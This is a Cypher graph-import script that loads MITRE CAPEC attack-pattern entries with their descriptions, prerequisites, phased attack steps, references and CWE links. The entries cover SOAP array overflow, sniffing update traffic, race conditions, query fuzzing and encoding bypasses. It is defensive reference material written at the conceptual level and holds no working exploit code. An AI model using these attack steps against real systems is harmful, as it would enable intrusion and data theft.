CREATE (:PreviousEntryName{id: 55, name: "DTD Injection in a SOAP Message"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 233, summary: "OrderedDict([('Text', 'This pattern has been deprecated as it was determined to be an unnecessary layer of abstraction. Please refer to the pattern CAPEC-228 : DTD Injection going forward.')])"});
CREATE (:AttackPattern{id: 256, name: "SOAP Array Overflow", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 214, text: "<div level=\"0\">\n  <p class=\"text\">The targeted SOAP server must trust that the array size as stated in messages it receives is correct, but read through the entire content of the message regardless of the stated size of the array.</p>\n</div>"});
CREATE (:Submission{id: 237});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 234, summary: "OrderedDict([('Text', 'An attacker sends a SOAP request with an array whose actual length exceeds the length indicated in the request. When a data structure including a SOAP array is instantiated, the sender transmits the size of the array as an explicit parameter along with the data. If the server processing the transmission naively trusts the specified size, then an attacker can intentionally understate the size of the array, possibly resulting in a buffer overflow if the server attempts to read the entire data set into the memory it allocated for a smaller array. This, in turn, can lead to a server crash or even the execution of arbitrary code.')])"});
MERGE (:Reference{local_id: "R.256.1", author: "Robin Cover, ed.", title: "XML and Web Services In The News", link: "http://www.xml.org/xml/news/archives/archive.11292006.shtml"});
MERGE (:Reference{local_id: "R.256.2", title: "Simple Object Access Protocol (SOAP) 1.1", section: "5.4.2 Arrays", publisher: "W3C", pubdate: "November 29, 2006", link: "http://www.w3.org/TR/2000/NOTE-SOAP-20000508/#_Toc478383522"});
CREATE (:ResourcesRequired{id: 137, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must be able to craft malformed SOAP messages, specifically, messages with arrays where the stated array size understates the actual size of the array in the message.</p>\n</div>"});
CREATE (:AttackPattern{id: 257, name: "DEPRECATED: Abuse of Transaction Data Structure", status: "Deprecated", pattern_abstraction: "Meta", pattern_completeness: "Hook"});
CREATE (:Submission{id: 238});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 191});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Modification{id: 192});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Description, Description Summary"});
CREATE (:PreviousEntryName{id: 56, name: "Abuse of Transaction Data Structure"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 235, summary: "OrderedDict([('Text', 'This attack pattern has been deprecated as it did not appear to be a valid attack pattern.')])"});
CREATE (:AttackPattern{id: 258, name: "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Dynamic Update", status: "Deprecated", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 215, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must be able to employ a sniffer in the path between the server and client without being detected. The targeted application must be configured to periodically check for updates from the server.</p>\n</div>"});
CREATE (:Submission{id: 239});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 193});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:PreviousEntryName{id: 57, name: "Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Dynamic Update"});
MERGE (:Date{date: "2017-01-09"});
CREATE (:Description{id: 236, summary: "OrderedDict([('Text', 'Attackers can capture application code bound for an authorized client during a dynamic update and can use it, as-is or through reverse-engineering, to glean sensitive information or exploit the trust relationship between the client and server.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <h1>Set up a sniffer</h1>\n  <p class=\"text\">The attacker sets up a sniffer in the path between the server and the client and watches the traffic.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker sets up a sniffer in the path between the server and the client.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker successfully sets up a sniffer in the path between the server and client."});
CREATE (:Outcome{id: 2, type: "Failure", description: "The attacker could not set up a sniffer in the path between the server and client."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <h1>Capturing Application Code Bound During Patching</h1>\n  <p class=\"text\">Attacker knows that the computer/OS/application periodically checks for an available update or that the end user can manually initiate a check for an update, loads the sniffer set up during Explore phase, and extracts the updated code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Attacker loads the sniffer to capture the application code bound during a dynamic update.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The attacker proceeds to reverse engineer the captured code.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The attacker can capture the application code bound for the target.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">The communication between the server and client is encrypted. The attacker may still possible to lift key material from the client.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker captures the application code bound for the target and reverse engineers the captured code."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
MERGE (:CWE{id: 311});
CREATE (:ResourcesRequired{id: 138, text: "<div level=\"0\">\n  <p class=\"text\">The Attacker needs the ability to capture communications between the client and server during an update. In the case that encryption obscures client/server communication the attacker needs to lift key material from the client.</p>\n</div>"});
CREATE (:AttackPattern{id: 259, name: "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Patching", status: "Deprecated", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 216, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must be able to employ a sniffer in the path between the server and client without being detected. The targeted application must receive some patches from the server.</p>\n</div>"});
CREATE (:Submission{id: 240});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 194});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:PreviousEntryName{id: 58, name: "Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Patching"});
MERGE (:Date{date: "2017-01-09"});
CREATE (:Description{id: 237, summary: "OrderedDict([('Text', 'Attackers can capture application code bound for an authorized client during patching and can use it, as-is or through reverse-engineering, to glean sensitive information or exploit the trust relationship between the client and server.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Set up a sniffer", description: "<div level=\"0\">\n  <p class=\"text\">The attacker sets up a sniffer in the path between the server and the client and watches the traffic.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker sets up a sniffer in the path between the server and the client.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker successfully sets up a sniffer in the path between the server and client."});
CREATE (:Outcome{id: 2, type: "Failure", description: "The attacker could not set up a sniffer in the path between the server and client."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Capturing Application Code Bound During Patching", description: "<div level=\"0\">\n  <p class=\"text\">Attacker receives notification that the computer/OS/application has an available update for patching, loads the sniffer set up during Explore phase, and extracts patching code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Attacker loads the sniffer to capture the application code bound during patching.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The attacker proceeds to reverse engineer the captured code.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The attacker can capture the application code bound for the target.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">The communication between the server and client is encrypted. The attacker may still possible to lift key material from the client.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker captures the application code bound for the target and reverse engineers the captured code."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
MERGE (:CWE{id: 311});
CREATE (:ResourcesRequired{id: 139, text: "<div level=\"0\">\n  <p class=\"text\">The Attacker needs the ability to capture communications between the client and server during patching. In the case that encryption obscures client/server communication the attacker needs to lift key material from the client.</p>\n</div>"});
CREATE (:AttackPattern{id: 26, name: "Leveraging Race Conditions", status: "Stable", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 217, text: "<div level=\"0\">\n  <p class=\"text\">A resource is accessed/modified concurrently by multiple processes such that a race condition exists.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 218, text: "<div level=\"0\">\n  <p class=\"text\">The adversary has the ability to modify the resource.</p>\n</div>"});
CREATE (:Submission{id: 241});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 195});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns, Type (Relationship -> Attack_Pattern)"});
CREATE (:Modification{id: 196});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Activation_Zone, Attack_Phases, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact"});
CREATE (:Description{id: 238, summary: "OrderedDict([('Text', 'The adversary targets a race condition occurring when multiple processes access and manipulate the same resource concurrently, and the outcome of the execution depends on the particular order in which the access takes place. The adversary can leverage a race condition by \"running the race\", modifying the resource and modifying the normal execution flow. For instance, a race condition can occur while accessing a file: the adversary can trick the system by replacing the original file with his version and cause the system to read the malicious file.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The adversary explores to gauge what level of access he has.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The adversary gains access to a resource on the target host. The adversary modifies the targeted resource. The resource's value is used to determine the next normal execution action.</p>\n</div>"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The resource is modified/checked concurrently by multiple processes. By using one of the processes, the adversary is able to modify the value just before it is consumed by a different process. A race condition occurs and is exploited by the adversary to abuse the target host.</p>\n</div>"});
MERGE (:Reference{id: "REF-2", local_id: "R.26.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:Reference{id: "REF-3", local_id: "R.26.2", title: "Common Weakness Enumeration (CWE)", section: "CWE-362 - Race Conditions", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/362.html"});
MERGE (:Reference{id: "REF-6", local_id: "R.26.3", title: "Wikipedia", section: "Race condition", publisher: "The Wikimedia Foundation, Inc", link: "http://en.wikipedia.org/wiki/Race_condition"});
MERGE (:Reference{id: "REF-16", local_id: "R.26.4", author: "David Wheeler", title: "Secure programmer: Prevent race conditions", publisher: "IBM", link: "http://www.ibm.com/developerworks/linux/library/l-sprace/index.html"});
MERGE (:Reference{id: "REF-41", local_id: "R.26.5", author: "Fortify Software", title: "SAMATE - Software Assurance Metrics And Tool Evaluation", section: "Test Case ID 1598", publisher: "National Institute of Standards and Technology (NIST)", pubdate: "2006-06-22", link: "http://samate.nist.gov/SRD/view_testcase.php?tID=1598"});
MERGE (:CWE{id: 368});
MERGE (:CWE{id: 363});
MERGE (:CWE{id: 366});
MERGE (:CWE{id: 370});
MERGE (:CWE{id: 362});
MERGE (:CWE{id: 662});
MERGE (:CWE{id: 689});
MERGE (:CWE{id: 667});
MERGE (:CWE{id: 665});
CREATE (:AttackPattern{id: 260, name: "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Initial Distribution", status: "Deprecated", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 219, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must be able to employ a sniffer in the path between the server and client without being detected. The targeted operating system or application must be configured to allow for end users to request new components and applications from the server.</p>\n</div>"});
CREATE (:Submission{id: 242});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 197});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:PreviousEntryName{id: 59, name: "Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Initial Distribution"});
MERGE (:Date{date: "2017-01-09"});
CREATE (:Description{id: 239, summary: "OrderedDict([('Block', OrderedDict([('Text', 'Attackers can capture new application installation code bound for an authorized client during initial distribution and can use it, as-is or through reverse-engineering, to glean sensitive information or exploit the trust relationship between the client and server.')]))])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Set up a sniffer", description: "<div level=\"0\">\n  <p class=\"text\">The attacker sets up a sniffer in the path between the server and the client and watches the traffic.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker sets up a sniffer in the path between the server and the client.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker successfully sets up a sniffer in the path between the server and client."});
CREATE (:Outcome{id: 2, type: "Failure", description: "The attacker could not set up a sniffer in the path between the server and client."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Capturing Application Code Bound During Patching", description: "<div level=\"0\">\n  <p class=\"text\">Attacker knows that the computer/OS/application can install additional components or full applications as requested by the user, loads the sniffer set up during Explore phase, and extracts the downloaded code from subsequent communication. The attacker then proceeds to reverse engineer the captured code and the communication protocols used.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Attacker loads the sniffer to capture the application code bound during an initial installation.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The attacker proceeds to reverse engineer the captured code.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The attacker can capture the application code bound for the target.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">The communication between the server and client is encrypted. The attacker may still possible to lift key material from the client.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker captures the application code bound for the target and reverse engineers the captured code."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
MERGE (:CWE{id: 311});
CREATE (:ResourcesRequired{id: 141, text: "<div level=\"0\">\n  <p class=\"text\">The Attacker needs the ability to capture communications between the client and server during an initial installation. In the case that encryption obscures client/server communication the attacker needs to lift key material from the client.</p>\n</div>"});
CREATE (:AttackPattern{id: 261, name: "Fuzzing for garnering other adjacent user/sensitive data", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 220, text: "<div level=\"0\">\n  <p class=\"text\">The server must assume that the queries it receives follow specific templates and/or have fields or attributes that follow specific procedures. The server must process queries that it receives without adequately checking or sanitizing queries to ensure they follow these templates.</p>\n</div>"});
CREATE (:Submission{id: 243});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 198});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 240, summary: "OrderedDict([('Text', \"An attacker who is authorized to send queries to a target sends variants of expected queries in the hope that these modified queries might return information (directly or indirectly through error logs) beyond what the expected set of queries should provide. Many client applications use specific query templates when interacting with a server and often automatically fill in specific fields or attributes. For example, a client that queries an employee database might have templates such that the user only supplies the target's name and the template dictates the fields to be returned (location, position in the company, phone number, etc.). If the server does not verify that the query matches one of the expected templates, an attacker who is allowed to send normal queries could modify their query to try to return additional information. In the above example, additional information might include social security numbers or salaries. Fuzzing techniques involve sending random or malformed messages to a target and monitoring the target's response. In this particular attack, the fuzzing is applied to the format of the expected templates, creating variants that request additional information, exclude limiting clauses, or alter fields that identify the requester in order to subvert access controls. The attacker may not know the names of fields to request or how other modifications will affect the server response, but by attempting multiple plausible variants, they might eventually trigger a server response that divulges sensitive information. Other possible outcomes include server crashes and resource consumption if the unexpected queries cause the server to enter an unstable state or perform excessive computation.\")])"});
CREATE (:ResourcesRequired{id: 142, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must have sufficient privileges to send queries to the targeted server. A normal client might limit the nature of these queries, so the attacker must either have a modified client or their own application which allows them to modify the expected queries.</p>\n</div>"});
CREATE (:AttackPattern{id: 263, name: "Force Use of Corrupted Files", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 221, text: "<div level=\"0\">\n  <p class=\"text\">The targeted application must utilize a configuration file that an attacker is able to corrupt. In some cases, the attacker must be able to force the (re-)reading of the corrupted file if the file is normally only consulted at startup.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 222, text: "<div level=\"0\">\n  <p class=\"text\">The severity of the attack hinges on how the application responds to the corrupted file. If the application detects the corruption and locks down, this may result in the denial of services provided by the application. If the application fails to detect the corruption, the result could be a more severe denial of service (crash or hang) or even an exploitable buffer overflow. If the application detects the corruption but fails in an unsafe way, this attack could result in the continuation of services but without certain security structures, such as filters or access controls. For example, if the corrupted file configures filters, an unsafe response from an application could result in simply disabling the filtering mechanisms due to the lack of usable configuration data.</p>\n</div>"});
CREATE (:Submission{id: 244});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 241, summary: "OrderedDict([('Text', 'This describes an attack where an application is forced to use a file that an attacker has corrupted. The result is often a denial of service caused by the application being unable to process the corrupted file, but other results, including the disabling of filters or access controls (if the application fails in an unsafe way rather than failing by locking down) or buffer overflows are possible.')])"});
CREATE (:ResourcesRequired{id: 143, text: "<div level=\"0\">\n  <p class=\"text\">This varies depending on the resources necessary to corrupt the configuration file and the resources needed to force the application to re-read it (if any).</p>\n</div>"});
CREATE (:AttackPattern{id: 264, name: "DEPRECATED: Environment Variable Manipulation", status: "Deprecated", pattern_abstraction: "Meta", pattern_completeness: "Hook"});
CREATE (:Submission{id: 245});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 199});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Modification{id: 200});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Prerequisites, Description Summary, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations"});
CREATE (:PreviousEntryName{id: 60, name: "Environment Variable Manipulation"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 242, summary: "OrderedDict([('Text', 'This attack pattern has been deprecated as it is a duplicate of the existing attack pattern \"CAPEC-13 : Subverting Environment Variable Values\". Please refer to this other CAPEC going forward.')])"});
CREATE (:AttackPattern{id: 265, name: "DEPRECATED: Global variable manipulation", status: "Deprecated", pattern_abstraction: "Meta", pattern_completeness: "Hook"});
CREATE (:Submission{id: 246});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 201});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Modification{id: 202});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Prerequisites, Description Summary, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations"});
CREATE (:PreviousEntryName{id: 61, name: "Global variable manipulation"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 243, summary: "OrderedDict([('Text', 'This attack pattern has been deprecated as it is a duplicate of the existing attack pattern \"CAPEC-77 : Manipulating User-Controlled Variables\". Please refer to this other CAPEC going forward.')])"});
CREATE (:AttackPattern{id: 266, name: "DEPRECATED: Manipulate Canonicalization", status: "Deprecated", pattern_abstraction: "Meta", pattern_completeness: "Hook"});
CREATE (:Submission{id: 247});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 203});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Modification{id: 204});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Description, Description Summary"});
CREATE (:PreviousEntryName{id: 62, name: "Manipulate Canonicalization"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 244, summary: "OrderedDict([('Text', 'This attack pattern has been deprecated.')])"});
CREATE (:AttackPattern{id: 267, name: "Leverage Alternate Encoding", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 223, text: "<div level=\"0\">\n  <p class=\"text\">The application's decoder accepts and interprets encoded characters. Data canonicalization, input filtering and validating is not done properly leaving the door open to harmful characters for the target host.</p>\n</div>"});
CREATE (:Submission{id: 248});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 205});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 245, summary: "OrderedDict([('Text', 'This attack leverages the possibility to encode potentially harmful input and submit it to applications not expecting or effective at validating this encoding standard making input filtering difficult.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Survey the application for user-controllable inputs", description: "<div level=\"0\">\n  <p class=\"text\">Using a browser, an automated tool or by inspecting the application, an attacker records all entry points to the application.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">Manually inspect the application to find entry points.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Inputs are used by the application or the browser (DOM)</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">Using URL rewriting, parameters may be part of the URL path.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">No parameters appear to be used by the application. Even though none appear, the application may still use them if they are provided.</p>\n</div>"});
CREATE (:Indicator{id: 4, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">No inputs seem to be used by the application. They might still be provided to another component (web service, database, system call, etc.).</p>\n</div>"});
CREATE (:Indicator{id: 5, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Applications that have only static pages or that simply present information without accepting input are unlikely to be susceptible.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A list of entry points (URL, parameters, configuration files, etc.) is created by the attacker."});
CREATE (:Outcome{id: 2, type: "Success", description: "A list of resources accessed by the application is created by the attacker."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Probe entry points to locate vulnerabilities", description: "<div level=\"0\">\n  <p class=\"text\">The attacker uses the entry points gathered in the \"Explore\" phase as a target list and injects various payloads using a variety of different types of encodings to determine if an entry point actually represents a vulnerability with insufficient validation logic and to characterize the extent to which the vulnerability can be exploited.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Try to use different encodings of content in order to bypass validation routines.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The application accepts user-controllable input.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker's encoded payload is processed and acted on by the application without filtering or transcoding."});
CREATE (:Outcome{id: 2, type: "Failure", description: "The application decodes the charset and filters the inputs."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
MERGE (:Reference{id: "REF-1", local_id: "R.267.1", title: "WASC Threat Classification 2.0", section: "WASC-20 - Improper Input Handling", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Improper-Input-Handling"});
MERGE (:Reference{id: "REF-4", local_id: "R.267.2", title: "OWASP", section: "Category: Encoding", publisher: "The Open Web Application Security Project (OWASP)", link: "http://www.owasp.org/index.php/Category:Encoding"});
MERGE (:Reference{id: "REF-4", local_id: "R.267.3", title: "OWASP", section: "Canonicalization, locale and Unicode", publisher: "The Open Web Application Security Project (OWASP)", link: "http://www.owasp.org/index.php/Canonicalization,_locale_and_Unicode"});
MERGE (:Reference{id: "REF-4", local_id: "R.267.4", title: "OWASP", section: "XSS (Cross Site Scripting) Prevention Cheat Sheet", publisher: "The Open Web Application Security Project (OWASP)", link: "http://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet"});
MERGE (:Reference{id: "REF-18", local_id: "R.267.5", author: "David Wheeler", title: "Secure Programming for Linux and Unix HOWTO", section: "Chapter 5 Section 9: Character Encoding", link: "http://www.dwheeler.com/secure-programs/Secure-Programs-HOWTO/character-encoding.html"});
MERGE (:Reference{id: "REF-6", local_id: "R.267.6", title: "Wikipedia", section: "Character encoding", publisher: "The Wikimedia Foundation, Inc", link: "http://en.wikipedia.org/wiki/Character_encoding"});
MERGE (:Reference{id: "REF-19", local_id: "R.267.7", author: "Eric Hacker", title: "IDS Evasion with Unicode", pubdate: "January 3, 2001", link: "http://www.securityfocus.com/infocus/1232"});
MERGE (:CWE{id: 173});
MERGE (:CWE{id: 172});
MERGE (:CWE{id: 180});
MERGE (:CWE{id: 181});
MERGE (:CWE{id: 171});
MERGE (:CWE{id: 73});
MERGE (:CWE{id: 21});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 697});
MERGE (:CWE{id: 692});
CREATE (:AttackPattern{id: 268, name: "Audit Log Manipulation", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 224, text: "<div level=\"0\">\n  <p class=\"text\">The target host is logging the action and data of the user.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 225, text: "<div level=\"0\">\n  <p class=\"text\">The target host insufficiently protects access to the logs or logging mechanisms.</p>\n</div>"});
CREATE (:Submission{id: 249});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
